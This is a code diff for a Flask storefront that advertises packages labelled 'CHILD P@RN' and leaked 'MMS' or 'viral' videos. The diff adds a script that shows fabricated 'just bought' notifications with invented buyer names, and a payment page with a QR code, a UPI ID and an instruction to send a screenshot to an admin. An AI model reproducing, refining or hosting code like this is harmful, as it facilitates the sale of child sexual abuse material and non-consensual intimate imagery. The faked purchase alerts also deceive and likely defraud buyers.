@@ -3,7 +3,7 @@ from flask import Flask, render_template_string, request
 
 app = Flask(__name__)
 
-# Premium Packages Data
+# Packages Data
 PACKAGES = {
     "CHILD": {
         "name": "CHILD P@RN",
@@ -38,24 +38,35 @@ HTML_CODE = """
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Premium Store</title>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background: #0f0f0f; color: white; margin: 0; padding: 0; }
-        .marquee { background: #d9534f; padding: 12px 0; font-weight: bold; font-size: 18px; overflow: hidden; position: sticky; top: 0; z-index: 1000; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0f0f0f; color: white; margin: 0; padding: 0; overflow-x: hidden; }
+        
+        /* Sliding Store Name */
+        .marquee { background: #d9534f; color: white; padding: 10px 0; font-weight: bold; font-size: 20px; overflow: hidden; position: sticky; top: 0; z-index: 1000; }
         .marquee-content { display: inline-block; white-space: nowrap; animation: marquee 15s linear infinite; }
         @keyframes marquee { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
-        
-        #notify { position: fixed; bottom: 20px; left: 20px; background: #fff; color: #333; padding: 10px 20px; border-radius: 30px; display: none; z-index: 9999; border-left: 5px solid #28a745; font-size: 14px; }
+
+        /* Notification Styling */
+        #notification-box { position: fixed; bottom: 20px; left: 20px; background: rgba(255, 255, 255, 0.95); color: #333; padding: 12px 20px; border-radius: 50px; box-shadow: 0 5px 15px rgba(0,0,0,0.3); display: none; z-index: 9999; animation: slideIn 0.5s ease-out; font-size: 14px; border-left: 5px solid #28a745; }
+        @keyframes slideIn { from { transform: translateX(-120%); } to { transform: translateX(0); } }
+
         .container { padding: 20px; text-align: center; }
-        .card { background: #1a1a1a; margin: 25px auto; padding: 20px; border-radius: 20px; max-width: 450px; border: 1px solid #333; box-shadow: 0 10px 20px rgba(0,0,0,0.5); }
-        video { width: 100%; height: 250px; border-radius: 15px; border: 1px solid #444; }
-        h3 { color: #d9534f; font-size: 24px; margin: 15px 0 5px; }
-        .price { font-size: 20px; font-weight: bold; color: #28a745; margin-bottom: 10px; }
-        .caption { font-size: 15px; color: #bbb; white-space: pre-line; margin-bottom: 15px; }
-        .btn-buy { background: #28a745; color: white; border: none; padding: 15px; width: 100%; border-radius: 10px; font-size: 18px; cursor: pointer; }
+        .card { background: #1a1a1a; margin: 20px auto; padding: 20px; border-radius: 15px; max-width: 450px; border: 1px solid #333; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        video { width: 100%; border-radius: 10px; border: 1px solid #444; }
+        h3 { color: #d9534f; font-size: 26px; margin: 15px 0 5px; }
+        .price { font-size: 20px; font-weight: bold; color: #28a745; }
+        .caption { font-size: 14px; color: #bbb; white-space: pre-line; margin: 10px 0; }
+        .btn-buy { background: #28a745; color: white; border: none; padding: 15px; width: 100%; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; margin-top: 10px; }
+        .btn-buy:hover { background: #218838; }
     </style>
 </head>
 <body>
-    <div class="marquee"><div class="marquee-content">🔥 WELCOME TO PREMIUM STORE - FAST DELIVERY - 100% TRUSTED - HIGH QUALITY 🔥</div></div>
-    <div id="notify"></div>
+
+    <div class="marquee">
+        <div class="marquee-content">🔥 WELCOME TO PREMIUM MMS STORE - 100% TRUSTED - FAST DELIVERY - HIGH QUALITY 🔥</div>
+    </div>
+
+    <div id="notification-box"></div>
+
     <div class="container">
         {% for pkg, data in packages.items() %}
             <div class="card">
@@ -70,16 +81,25 @@ HTML_CODE = """
             </div>
         {% endfor %}
     </div>
+
     <script>
-        const names = ["Rahul", "Aryan", "Vikram", "Sneha", "Priya", "Amit"];
-        const cats = ["CHILD P@RN", "MMS ONLY", "MMS+VIRAL"];
-        function showNotify() {
-            const box = document.getElementById('notify');
-            box.innerHTML = `✅ <b>${names[Math.floor(Math.random()*names.length)]}</b> just bought <b>${cats[Math.floor(Math.random()*cats.length)]}</b> 1m ago`;
+        const names = ["Rahul", "Aryan", "Vikram", "Sneha", "Priya", "Amit", "Sumit", "Karan", "Nitin", "Deepak"];
+        const cats = ["CHILD P@RN", "MMS ONLY", "MMS + INSTA VIRAL"];
+        
+        function showNotification() {
+            const box = document.getElementById('notification-box');
+            const name = names[Math.floor(Math.random() * names.length)];
+            const cat = cats[Math.floor(Math.random() * cats.length)];
+            
+            box.innerHTML = `✅ <b>${name}</b> just bought <b>${cat}</b> 1m ago`;
             box.style.display = 'block';
-            setTimeout(() => { box.style.display = 'none'; }, 4000);
+
+            setTimeout(() => {
+                box.style.display = 'none';
+            }, 4000);
         }
-        setInterval(showNotify, 7000);
+
+        setInterval(showNotification, 8000); // Har 8 second mein notification
     </script>
 </body>
 </html>
@@ -91,9 +111,21 @@ def home():
 
 @app.route('/pay', methods=['POST'])
 def pay():
-    pkg = request.form.get('package')
-    data = PACKAGES[pkg]
+    pkg_key = request.form.get('package')
+    data = PACKAGES[pkg_key]
     return f"""
-    <body style="text-align:center; font-family:sans-serif; background:#0f0f0f; color:white; padding:20px; display:flex; flex-direction:column; justify-content:center; align-items:center; min-height:100vh; margin:0;">
-        <h1 style="color
+    <body style="text-align:center; font-family:sans-serif; background:#0f0f0f; color:white; padding: 40px;">
+        <h1 style="color: #d9534f;">FINAL STEP: PAYMENT</h1>
+        <h2 style="font-size: 24px;">Package: {data['name']}</h2>
+        <p style="font-size: 20px; color: #28a745;">Amount: {data['price']}</p>
+        <img src="{QR_LINK}" style="width: 320px; border: 5px solid white; border-radius: 15px; margin: 20px 0;">
+        <p style="font-size: 18px;">UPI ID: <b>Q691189350@ybl</b></p>
+        <p style="color: yellow; font-weight: bold;">Step 2: Send screenshot to Admin after payment.</p>
+        <br><a href="/" style="color: #bbb; font-size: 18px; text-decoration: none;">🔙 Cancel & Go Back</a>
+    </body>
+    """
+
+if __name__ == '__main__':
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host='0.0.0.0', port=port)
     
